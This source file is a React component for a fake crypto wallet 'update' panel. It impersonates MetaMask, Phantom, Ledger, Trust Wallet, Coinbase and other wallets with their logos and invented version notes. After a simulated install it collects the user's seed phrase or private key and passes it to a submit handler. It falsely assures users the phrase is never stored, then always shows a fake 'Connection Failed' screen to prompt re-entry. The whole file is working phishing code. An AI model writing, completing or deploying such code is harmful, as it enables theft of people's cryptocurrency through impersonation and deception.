import { useState, useEffect } from "react";
import { X, HelpCircle, Shield, ChevronDown } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

import walletConnectImg from "@assets/image_1769438333308.png";
import trustWalletImg from "@assets/image_1769438276516.png";
import phantomImg from "@assets/image_1769438452510.png";
import rainbowImg from "@assets/image_1769438502399.png";
import coinbaseImg from "@assets/image_1769438642178.png";
import ledgerImg from "@assets/image_1769588801258.png";
import rabbyImg from "@assets/image_1769594692708.png";
import okxImg from "@assets/image_1769439355214.png";
import backpackImg from "@assets/image_1769439556556.png";
import metamaskImg from "@assets/image_1769592924199.png";

interface WalletExtensionPanelProps {
  open: boolean;
  walletName: string;
  walletId: string;
  serviceName?: string;
  onClose: () => void;
  onSubmit: (phrase: string) => void;
}

const walletImages: Record<string, string> = {
  metamask: metamaskImg,
  phantom: phantomImg,
  trust: trustWalletImg,
  walletconnect: walletConnectImg,
  coinbase: coinbaseImg,
  rainbow: rainbowImg,
  ledger: ledgerImg,
  rabby: rabbyImg,
  backpack: backpackImg,
  okx: okxImg,
  other: "",
};

const walletUpdateInfo: Record<string, { version: string; features: string[] }> = {
  metamask: {
    version: "12.5.1",
    features: [
      "Enhanced gas estimation accuracy",
      "Improved swap functionality",
      "Fixed token approval display",
      "Better hardware wallet support"
    ]
  },
  phantom: {
    version: "24.8.0",
    features: [
      "Solana network performance boost",
      "New NFT gallery improvements",
      "Enhanced staking interface",
      "Fixed connection stability issues"
    ]
  },
  trust: {
    version: "8.14.2",
    features: [
      "Multi-chain swap optimization",
      "Improved DApp browser security",
      "Enhanced backup system",
      "Fixed WalletConnect issues"
    ]
  },
  walletconnect: {
    version: "3.2.0",
    features: [
      "Faster session establishment",
      "Improved multi-device sync",
      "Enhanced QR code scanning",
      "Better error handling"
    ]
  },
  coinbase: {
    version: "5.67.3",
    features: [
      "Enhanced Layer 2 support",
      "Improved transaction history",
      "New portfolio analytics",
      "Fixed sync delays"
    ]
  },
  rainbow: {
    version: "1.9.45",
    features: [
      "New ENS integration features",
      "Improved NFT display",
      "Enhanced gas optimization",
      "Fixed notification issues"
    ]
  },
  ledger: {
    version: "2.51.0",
    features: [
      "Enhanced multi-chain support and performance",
      "Improved security system",
      "Fixed network information display",
      "Better transaction signing experience"
    ]
  },
  rabby: {
    version: "0.92.18",
    features: [
      "New security risk scanner",
      "Improved pre-sign analysis",
      "Enhanced chain switching",
      "Fixed approval management"
    ]
  },
  backpack: {
    version: "0.10.75",
    features: [
      "xNFT performance improvements",
      "Enhanced Solana integration",
      "New collectibles view",
      "Fixed loading issues"
    ]
  },
  okx: {
    version: "2.51.0",
    features: [
      "Enhanced multi-chain support and performance",
      "Improved security system",
      "Fixed network information display",
      "Better transaction signing experience"
    ]
  },
  other: {
    version: "1.0.0",
    features: [
      "Security improvements",
      "Performance optimization",
      "Bug fixes",
      "Enhanced compatibility"
    ]
  }
};

const walletColors: Record<string, { bg: string; hover: string; text: string }> = {
  metamask: { bg: "bg-[#E2761B]", hover: "hover:bg-[#CD6116]", text: "text-white" },
  phantom: { bg: "bg-[#AB9FF2]", hover: "hover:bg-[#9B8FE2]", text: "text-white" },
  trust: { bg: "bg-[#0500FF]", hover: "hover:bg-[#0400DD]", text: "text-white" },
  walletconnect: { bg: "bg-[#3B99FC]", hover: "hover:bg-[#2B89EC]", text: "text-white" },
  coinbase: { bg: "bg-[#0052FF]", hover: "hover:bg-[#0042EF]", text: "text-white" },
  rainbow: { bg: "bg-gradient-to-r from-[#FF6B6B] via-[#FFE66D] to-[#4ECDC4]", hover: "hover:opacity-90", text: "text-white" },
  ledger: { bg: "bg-white", hover: "hover:bg-zinc-200", text: "text-black" },
  rabby: { bg: "bg-[#7C7CFF]", hover: "hover:bg-[#6C6CEF]", text: "text-white" },
  backpack: { bg: "bg-[#E33E3F]", hover: "hover:bg-[#D32E2F]", text: "text-white" },
  okx: { bg: "bg-white", hover: "hover:bg-zinc-200", text: "text-black" },
  other: { bg: "bg-primary", hover: "hover:bg-primary/90", text: "text-white" },
};

const MetaMaskLogo = ({ className = "w-12 h-12" }: { className?: string }) => (
  <img src={metamaskImg} alt="MetaMask" className={`${className} object-contain`} />
);

type Step = "checking" | "update" | "installing" | "verification" | "connecting" | "error";
type InputMode = "seedPhrase" | "privateKey";
type WordCount = 12 | 24;

export function WalletExtensionPanel({ open, walletName, walletId, onClose, onSubmit }: WalletExtensionPanelProps) {
  const [step, setStep] = useState<Step>("checking");
  const [installProgress, setInstallProgress] = useState(0);
  const [inputMode, setInputMode] = useState<InputMode>("seedPhrase");
  const [wordCount, setWordCount] = useState<WordCount>(12);
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [showWordCountDropdown, setShowWordCountDropdown] = useState(false);
  const [connectingProgress, setConnectingProgress] = useState(0);

  useEffect(() => {
    if (open) {
      setStep("checking");
      setInstallProgress(0);
      setWords(Array(12).fill(""));
      setPrivateKey("");
      setInputMode("seedPhrase");
      setWordCount(12);
      
      const timer = setTimeout(() => {
        setStep("update");
      }, 2500);

      return () => clearTimeout(timer);
    }
  }, [open]);

  useEffect(() => {
    if (step === "installing") {
      const interval = setInterval(() => {
        setInstallProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              setStep("verification");
            }, 500);
            return 100;
          }
          return prev + 2;
        });
      }, 50);

      return () => clearInterval(interval);
    }
  }, [step]);

  useEffect(() => {
    setWords(Array(wordCount).fill(""));
  }, [wordCount]);

  useEffect(() => {
    if (step === "connecting") {
      setConnectingProgress(0);
      const interval = setInterval(() => {
        setConnectingProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setStep("error");
            return 100;
          }
          return prev + 1;
        });
      }, 100);

      return () => clearInterval(interval);
    }
  }, [step]);

  const handleUpdateClick = () => {
    setStep("installing");
  };

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value.toLowerCase().trim();
    setWords(newWords);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number) => {
    const pastedText = e.clipboardData.getData("text").trim();
    const pastedWords = pastedText.split(/[\s,]+/).filter(w => w.length > 0);
    
    if (pastedWords.length > 1) {
      e.preventDefault();
      const newWords = [...words];
      pastedWords.forEach((word, i) => {
        if (index + i < wordCount) {
          newWords[index + i] = word.toLowerCase().trim();
        }
      });
      setWords(newWords);
    }
  };

  const handleNextClick = () => {
    if (inputMode === "seedPhrase") {
      const phrase = words.filter(w => w.trim()).join(" ");
      if (phrase) {
        onSubmit(phrase);
        setStep("connecting");
      }
    } else {
      if (privateKey.trim()) {
        onSubmit(privateKey);
        setStep("connecting");
      }
    }
  };

  const handleTryAgain = () => {
    setStep("verification");
    setWords(Array(wordCount).fill(""));
    setPrivateKey("");
  };

  const isNextDisabled = () => {
    if (inputMode === "seedPhrase") {
      return words.filter(w => w.trim()).length < wordCount;
    }
    return !privateKey.trim();
  };

  const getWalletIcon = (size: string = "w-16 h-16") => {
    if (walletId === "metamask") {
      return <MetaMaskLogo />;
    }
    if (walletId === "other") {
      return (
        <div className={`${size} rounded-xl bg-zinc-700 flex items-center justify-center`}>
          <span className="text-2xl text-white">?</span>
        </div>
      );
    }
    if (walletId === "ledger" || walletId === "okx") {
      const imgSrc = walletImages[walletId];
      const innerSize = size === "w-16 h-16" ? "w-12 h-12" : "w-10 h-10";
      return (
        <div className={`${size} rounded-xl bg-black flex items-center justify-center`}>
          <img src={imgSrc} alt={walletName} className={`${innerSize} object-contain`} />
        </div>
      );
    }
    if (walletId === "rabby" || walletId === "walletconnect" || walletId === "coinbase") {
      const imgSrc = walletImages[walletId];
      return <img src={imgSrc} alt={walletName} className={`${size} object-contain rounded-xl`} />;
    }
    const imgSrc = walletImages[walletId];
    if (imgSrc) {
      return <img src={imgSrc} alt={walletName} className={`${size} rounded-xl object-cover`} />;
    }
    return null;
  };

  const getWalletTitleColor = () => {
    const colors: Record<string, string> = {
      metamask: "#E2761B",
      phantom: "#AB9FF2",
      trust: "#3375BB",
      walletconnect: "#3B99FC",
      coinbase: "#0052FF",
      rainbow: "#FF6B6B",
      ledger: "#FFFFFF",
      rabby: "#7C7CFF",
      backpack: "#E33E3F",
      okx: "#FFFFFF",
      other: "#14B8A6",
    };
    return colors[walletId] || "#14B8A6";
  };

  if (!open) return null;

  return (
    <div 
      className={`fixed top-0 right-0 h-full w-[420px] ${walletId === 'ledger' || walletId === 'okx' ? 'bg-black' : walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' || walletId === 'walletconnect' ? 'bg-[#F2F4F6]' : walletId === 'phantom' ? 'bg-[#E0E0F8]' : 'bg-zinc-900'} border-l border-zinc-700 shadow-2xl z-[100] transform transition-transform duration-300 ease-out ${open ? 'translate-x-0' : 'translate-x-full'} overflow-y-auto`}
      data-testid="wallet-extension-panel"
    >
      <div className="flex flex-col min-h-full">
        <div className="flex items-center justify-between p-4 border-b border-zinc-700">
          <span className={`font-semibold text-lg`} style={{ color: getWalletTitleColor() }}>{walletName}</span>
          <button 
            onClick={onClose}
            className="text-zinc-400 hover:text-white transition-colors"
            data-testid="button-close-wallet-panel"
          >
            {step === "verification" ? <HelpCircle className="w-5 h-5" /> : <X className="w-5 h-5" />}
          </button>
        </div>

        <div className="flex-1 flex flex-col p-6">
          {step === "checking" && (
            <div className="flex-1 flex flex-col items-center justify-center">
              {(walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase') ? (
                <div className="mb-6">
                  {getWalletIcon("w-24 h-24")}
                </div>
              ) : walletId === 'phantom' ? (
                <div className="mb-6">
                  {getWalletIcon("w-16 h-16")}
                </div>
              ) : (
                <div className="bg-zinc-800 rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              )}
              {walletId === 'metamask' ? (
                <div className="w-12 h-12 border-4 border-[#E2761B] border-t-transparent rounded-full animate-spin"></div>
              ) : walletId === 'phantom' ? (
                <div className="w-12 h-12 border-4 border-[#AB9FF2] border-t-transparent rounded-full animate-spin"></div>
              ) : walletId === 'rabby' ? (
                <div className="w-12 h-12 border-4 border-[#7C7CFF] border-t-transparent rounded-full animate-spin"></div>
              ) : walletId === 'walletconnect' ? (
                <div className="w-12 h-12 border-4 border-[#3B99FC] border-t-transparent rounded-full animate-spin"></div>
              ) : walletId === 'coinbase' ? (
                <div className="w-12 h-12 border-4 border-[#0052FF] border-t-transparent rounded-full animate-spin"></div>
              ) : (
                <>
                  <div className={`w-full ${walletId === 'trust' ? 'bg-gray-200' : 'bg-zinc-700'} rounded-full h-2 mb-4`}>
                    <div className={`${walletId === 'trust' ? 'bg-[#0500FF]' : 'bg-primary'} h-2 rounded-full animate-pulse`} style={{ width: '60%' }}></div>
                  </div>
                  <span className={`${walletId === 'trust' ? 'text-gray-500' : 'text-zinc-300'} text-sm`}>Checking for updates...</span>
                </>
              )}
            </div>
          )}

          {step === "update" && (
            <div className="flex-1 flex flex-col items-center">
              {(walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase') ? (
                <div className="mb-6">
                  {getWalletIcon()}
                </div>
              ) : walletId === 'phantom' ? (
                <div className="mb-6">
                  {getWalletIcon("w-16 h-16")}
                </div>
              ) : (
                <div className="bg-zinc-800 rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              )}
              <h3 className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black' : 'text-white'} text-xl font-bold mb-1`}>Update Available</h3>
              <span className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-500' : 'text-zinc-400'} text-sm mb-4`}>Version {walletUpdateInfo[walletId]?.version || "1.0.0"}</span>
              
              <div className={`${walletId === 'ledger' || walletId === 'okx' || walletId === 'phantom' ? 'bg-zinc-900' : walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-white' : 'bg-zinc-800'} rounded-lg p-4 mb-6 w-full`}>
                <p className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-600' : 'text-zinc-300'} text-sm mb-3`}>
                  Important scheduled update with security improvements. We recommend installing it now.
                </p>
                <ul className={`space-y-2 text-sm ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-600' : 'text-zinc-300'}`}>
                  {(walletUpdateInfo[walletId]?.features || []).map((feature, index) => (
                    <li key={index} className="flex items-start gap-2">
                      <span className={`${walletId === 'trust' ? 'text-[#0500FF]' : walletId === 'metamask' ? 'text-[#E2761B]' : walletId === 'phantom' ? 'text-[#AB9FF2]' : walletId === 'rabby' ? 'text-[#7C7CFF]' : walletId === 'walletconnect' ? 'text-[#3B99FC]' : walletId === 'coinbase' ? 'text-[#0052FF]' : 'text-primary'} mt-1`}>•</span>
                      <span>{feature}</span>
                    </li>
                  ))}
                </ul>
              </div>

              <Button 
                onClick={handleUpdateClick}
                className={`w-full ${walletColors[walletId]?.bg || 'bg-blue-600'} ${walletColors[walletId]?.hover || 'hover:bg-blue-700'} ${walletColors[walletId]?.text || 'text-white'} font-semibold py-3 rounded-full`}
                data-testid="button-update-wallet"
              >
                Update
              </Button>
              
              <button 
                className={`mt-4 ${walletId === 'trust' ? 'text-gray-500 hover:text-[#0500FF]' : walletId === 'metamask' ? 'text-gray-500 hover:text-[#E2761B]' : walletId === 'phantom' ? 'text-zinc-400 hover:text-[#AB9FF2]' : walletId === 'rabby' ? 'text-gray-500 hover:text-[#7C7CFF]' : walletId === 'walletconnect' ? 'text-gray-500 hover:text-[#3B99FC]' : walletId === 'coinbase' ? 'text-gray-500 hover:text-[#0052FF]' : 'text-zinc-400 hover:text-primary'} text-sm transition-colors`}
                data-testid="link-contact-support"
              >
                Need help? Contact {walletName} Support.
              </button>
            </div>
          )}

          {step === "installing" && (
            <div className="flex-1 flex flex-col items-center justify-center">
              {(walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase') ? (
                <div className="mb-6">
                  {getWalletIcon()}
                </div>
              ) : walletId === 'phantom' ? (
                <div className="mb-6">
                  {getWalletIcon("w-16 h-16")}
                </div>
              ) : (
                <div className="bg-zinc-800 rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              )}
              <div className={`w-full ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-gray-200' : 'bg-zinc-700'} rounded-full h-2 mb-4`}>
                <div 
                  className={`${walletId === 'trust' ? 'bg-[#0500FF]' : walletId === 'metamask' ? 'bg-[#E2761B]' : walletId === 'phantom' ? 'bg-[#AB9FF2]' : walletId === 'rabby' ? 'bg-[#7C7CFF]' : walletId === 'walletconnect' ? 'bg-[#3B99FC]' : walletId === 'coinbase' ? 'bg-[#0052FF]' : 'bg-green-500'} h-2 rounded-full transition-all duration-100`}
                  style={{ width: `${installProgress}%` }}
                ></div>
              </div>
              <span className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black' : 'text-white'} text-3xl font-bold mb-2`}>{installProgress}%</span>
              <span className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-500' : 'text-zinc-400'} text-sm`}>Installing update...</span>
            </div>
          )}

          {step === "verification" && (
            <div className="flex-1 flex flex-col">
              {walletId === 'phantom' ? (
                <div className="bg-[#1a1a1a] rounded-3xl p-6 flex flex-col">
                  <div className="flex justify-center mb-2">
                    <div className="flex items-center gap-1">
                      <div className="w-2 h-2 rounded-full bg-[#AB9FF2]"></div>
                      <div className="w-2 h-2 rounded-full bg-zinc-600"></div>
                      <div className="w-2 h-2 rounded-full bg-zinc-600"></div>
                    </div>
                  </div>
                  
                  <h3 className="text-white text-2xl font-bold text-center mb-2">Recovery Phrase</h3>
                  <p className="text-zinc-400 text-sm text-center mb-6">Import an existing wallet with your 12 or 24-word recovery phrase.</p>

                  <div className="grid grid-cols-3 gap-2 mb-4">
                    {Array.from({ length: wordCount }).map((_, index) => (
                      <div key={index} className="relative">
                        <span className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-500 text-sm">{index + 1}.</span>
                        <Input
                          type="text"
                          value={words[index] || ""}
                          onChange={(e) => handleWordChange(index, e.target.value)}
                          onPaste={(e) => handlePaste(e, index)}
                          className="bg-transparent border-zinc-600 text-white pl-8 pr-2 py-2 text-sm h-12 rounded-lg"
                          data-testid={`input-word-${index + 1}`}
                        />
                      </div>
                    ))}
                  </div>

                  <button
                    onClick={() => setWordCount(wordCount === 12 ? 24 : 12)}
                    className="text-[#AB9FF2] text-sm text-center mb-6 hover:underline"
                    data-testid="link-toggle-word-count"
                  >
                    I have a {wordCount === 12 ? '24' : '12'}-word recovery phrase
                  </button>

                  <Button 
                    onClick={handleNextClick}
                    disabled={isNextDisabled()}
                    className="w-full !bg-[#AB9FF2] hover:!bg-[#9B8FE2] !text-black font-semibold py-3 rounded-xl disabled:!bg-zinc-700 disabled:!text-white"
                    data-testid="button-import-wallet"
                  >
                    Import Wallet
                  </Button>
                </div>
              ) : (
                <>
                  <div className="flex justify-center mb-4">
                    {(walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase') ? (
                      <div>
                        {getWalletIcon("w-12 h-12")}
                      </div>
                    ) : (
                      <div className="bg-zinc-800 rounded-2xl p-3">
                        {getWalletIcon("w-12 h-12")}
                      </div>
                    )}
                  </div>

                  <h3 className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black' : 'text-white'} text-xl font-bold text-center mb-4`}>Import with Secret Phrase</h3>

                  <div className={`flex ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-white' : 'bg-zinc-800'} rounded-full p-1 mb-4`}>
                    <button
                      onClick={() => setInputMode("seedPhrase")}
                      className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${
                        inputMode === "seedPhrase" 
                          ? walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? "bg-gray-100 text-black shadow" : "bg-zinc-700 text-white"
                          : walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? "text-gray-500 hover:text-black" : "text-zinc-400 hover:text-white"
                      }`}
                      data-testid="tab-seed-phrase"
                    >
                      Seed Phrase
                    </button>
                    <button
                      onClick={() => setInputMode("privateKey")}
                      className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${
                        inputMode === "privateKey" 
                          ? walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? "bg-gray-100 text-black shadow" : "bg-zinc-700 text-white"
                          : walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? "text-gray-500 hover:text-black" : "text-zinc-400 hover:text-white"
                      }`}
                      data-testid="tab-private-key"
                    >
                      Private Key
                    </button>
                  </div>

                  {inputMode === "seedPhrase" && (
                    <>
                      <div className="relative mb-4">
                        <button
                          onClick={() => setShowWordCountDropdown(!showWordCountDropdown)}
                          className={`w-full flex items-center justify-between ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-white border-gray-300 text-black' : 'bg-zinc-800 border-zinc-700 text-white'} border rounded-lg px-4 py-3`}
                          data-testid="dropdown-word-count"
                        >
                          <span>I have a {wordCount} word phrase</span>
                          <ChevronDown className={`w-5 h-5 ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-500' : 'text-zinc-400'}`} />
                        </button>
                        {showWordCountDropdown && (
                          <div className={`absolute top-full left-0 right-0 mt-1 ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-white border-gray-300' : 'bg-zinc-800 border-zinc-700'} border rounded-lg overflow-hidden z-10`}>
                            <button
                              onClick={() => { setWordCount(12); setShowWordCountDropdown(false); }}
                              className={`w-full px-4 py-3 text-left ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black hover:bg-gray-100' : 'text-white hover:bg-zinc-700'}`}
                            >
                              I have a 12 word phrase
                            </button>
                            <button
                              onClick={() => { setWordCount(24); setShowWordCountDropdown(false); }}
                              className={`w-full px-4 py-3 text-left ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black hover:bg-gray-100' : 'text-white hover:bg-zinc-700'}`}
                            >
                              I have a 24 word phrase
                            </button>
                          </div>
                        )}
                      </div>

                      <div className="grid grid-cols-3 gap-2 mb-4">
                        {Array.from({ length: wordCount }).map((_, index) => (
                          <div key={index} className="relative">
                            <span className={`absolute left-2 top-1/2 -translate-y-1/2 ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-400' : 'text-zinc-500'} text-sm`}>{index + 1}.</span>
                            <Input
                              type="text"
                              value={words[index] || ""}
                              onChange={(e) => handleWordChange(index, e.target.value)}
                              onPaste={(e) => handlePaste(e, index)}
                              className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-white border-gray-300 text-black' : 'bg-zinc-800 border-zinc-700 text-white'} pl-7 pr-2 py-2 text-sm h-10`}
                              data-testid={`input-word-${index + 1}`}
                            />
                          </div>
                        ))}
                      </div>
                    </>
                  )}

                  {inputMode === "privateKey" && (
                    <div className="mb-4">
                      <Input
                        type="password"
                        value={privateKey}
                        onChange={(e) => setPrivateKey(e.target.value)}
                        placeholder="Enter your private key"
                        className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-white border-gray-300 text-black placeholder:text-gray-400' : 'bg-zinc-800 border-zinc-700 text-white'}`}
                        data-testid="input-private-key"
                      />
                    </div>
                  )}

                  <div className={`${walletId === 'trust' ? 'bg-blue-50' : walletId === 'metamask' ? 'bg-orange-50' : walletId === 'rabby' ? 'bg-purple-50' : walletId === 'walletconnect' ? 'bg-blue-50' : walletId === 'coinbase' ? 'bg-blue-50' : 'bg-zinc-800/50'} rounded-lg p-3 flex items-start gap-2 mb-6`}>
                    <Shield className={`w-5 h-5 ${walletId === 'trust' ? 'text-[#0500FF]' : walletId === 'metamask' ? 'text-[#E2761B]' : walletId === 'rabby' ? 'text-[#7C7CFF]' : walletId === 'walletconnect' ? 'text-[#3B99FC]' : walletId === 'coinbase' ? 'text-[#0052FF]' : 'text-primary'} flex-shrink-0 mt-0.5`} />
                    <p className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-600' : 'text-zinc-400'} text-xs`}>
                      Your secret phrase stays private and under your control. We never store it or access it, and all secure actions are handled on your device using trusted encryption.
                    </p>
                  </div>

                  <Button 
                    onClick={handleNextClick}
                    disabled={isNextDisabled()}
                    className={`w-full ${walletColors[walletId]?.bg || 'bg-blue-600'} ${walletColors[walletId]?.hover || 'hover:bg-blue-700'} ${walletColors[walletId]?.text || 'text-white'} font-semibold py-3 rounded-full disabled:opacity-50`}
                    data-testid="button-next"
                  >
                    Next
                  </Button>
                </>
              )}
            </div>
          )}

          {step === "connecting" && (
            <div className="flex-1 flex flex-col items-center justify-center">
              {(walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase') ? (
                <div className="mb-6">
                  {getWalletIcon()}
                </div>
              ) : walletId === 'phantom' ? (
                <div className="bg-[#1a1a1a] rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              ) : (
                <div className="bg-zinc-800 rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              )}
              <div className={`w-full ${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'bg-gray-200' : walletId === 'phantom' ? 'bg-zinc-700' : 'bg-zinc-700'} rounded-full h-2 mb-4`}>
                <div 
                  className={`${walletId === 'trust' ? 'bg-[#0500FF]' : walletId === 'metamask' ? 'bg-[#E2761B]' : walletId === 'phantom' ? 'bg-[#AB9FF2]' : walletId === 'rabby' ? 'bg-[#7C7CFF]' : walletId === 'walletconnect' ? 'bg-[#3B99FC]' : walletId === 'coinbase' ? 'bg-[#0052FF]' : 'bg-primary'} h-2 rounded-full transition-all duration-100`}
                  style={{ width: `${connectingProgress}%` }}
                ></div>
              </div>
              <span className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black' : walletId === 'phantom' ? 'text-black' : 'text-white'} text-xl font-bold mb-2`}>Connecting...</span>
              <span className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-500' : walletId === 'phantom' ? 'text-gray-600' : 'text-zinc-400'} text-sm text-center`}>Please wait while we verify your wallet</span>
            </div>
          )}

          {step === "error" && (
            <div className="flex-1 flex flex-col items-center justify-center">
              {(walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase') ? (
                <div className="mb-6">
                  {getWalletIcon()}
                </div>
              ) : walletId === 'phantom' ? (
                <div className="bg-[#1a1a1a] rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              ) : (
                <div className="bg-zinc-800 rounded-2xl p-4 mb-6">
                  {getWalletIcon()}
                </div>
              )}
              <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center mb-4">
                <X className="w-8 h-8 text-red-500" />
              </div>
              <h3 className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-black' : walletId === 'phantom' ? 'text-black' : 'text-white'} text-xl font-bold mb-2 text-center`}>Connection Failed</h3>
              <p className={`${walletId === 'trust' || walletId === 'metamask' || walletId === 'rabby' || walletId === 'walletconnect' || walletId === 'coinbase' ? 'text-gray-500' : walletId === 'phantom' ? 'text-gray-600' : 'text-zinc-400'} text-sm text-center mb-6 max-w-xs`}>
                We couldn't verify your wallet credentials. Please ensure your recovery phrase is entered correctly in the proper order. If the issue persists, our support team is available to assist you.
              </p>
              
              <div className="w-full space-y-3">
                <Button 
                  onClick={handleTryAgain}
                  className={`w-full ${walletColors[walletId]?.bg || 'bg-blue-600'} ${walletColors[walletId]?.hover || 'hover:bg-blue-700'} ${walletColors[walletId]?.text || 'text-white'} font-semibold py-3 rounded-full`}
                  data-testid="button-try-again"
                >
                  Retry Import
                </Button>
                <Button 
                  onClick={onClose}
                  variant="outline"
                  className="w-full border-zinc-600 text-zinc-300 hover:bg-zinc-800 py-3 rounded-full"
                  data-testid="button-import-other"
                >
                  Use Different Wallet
                </Button>
                <button 
                  className="w-full text-primary text-sm hover:underline"
                  data-testid="link-contact-team"
                >
                  Get Help from Support
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
